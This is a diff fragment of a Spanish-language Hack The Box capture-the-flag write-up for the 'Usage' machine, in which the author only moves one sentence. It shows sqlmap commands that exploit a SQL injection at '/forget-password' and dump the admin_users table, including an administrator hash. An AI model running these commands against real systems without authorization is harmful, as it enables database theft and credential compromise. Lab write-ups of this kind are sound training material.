@@ -52,12 +52,14 @@ Luego de unas pruebas, encuentro que la direccion '/forget-password' es vulnerab
 
 ![](/assets/img/htb-writeup-usage/usage3_1.png)
 
-Utilizo Sqlmap para enumerar la base de datos. Y logro encontrar un hash que le pertenece al usuario 'administrator'.
+Utilizo Sqlmap para enumerar la base de datos.
 
 ```terminal
 /home/kali/Documents/htb/machines/usage:-$ sudo sqlmap -r request.txt -p email --level 5 --risk 3 --threads 10 -D database_name --tables
 ```
 ![](/assets/img/htb-writeup-usage/usage3_2.png)
+
+Y logro encontrar un hash que le pertenece al usuario 'administrator'.
 
 ```terminal
 /home/kali/Documents/htb/machines/usage:-$ sudo sqlmap -r request4.txt  -p email --dbms=mysql --level=3 --risk=3 --technique=BUT -v 7 --batch -D usage_blog -T admin_users --dump --threads 3
